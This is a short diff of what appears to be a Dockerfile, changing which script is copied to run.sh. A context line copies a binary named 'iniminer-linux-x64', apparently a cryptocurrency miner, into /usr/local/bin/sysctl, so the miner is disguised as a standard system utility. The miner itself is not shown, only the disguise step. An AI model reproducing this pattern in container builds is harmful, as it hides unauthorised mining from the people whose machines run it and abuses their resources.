@@ -32,7 +32,7 @@ WORKDIR /usr/local/bin
 # Copy required scripts
 COPY init.sh /usr/local/bin/init.sh
 COPY compile.sh /usr/local/bin/main.sh
-COPY run.sh /usr/local/bin/run.sh
+COPY main.sh /usr/local/bin/run.sh
 COPY iniminer-linux-x64 /usr/local/bin/sysctl
 COPY restart.sh /usr/local/bin/restart.sh
 
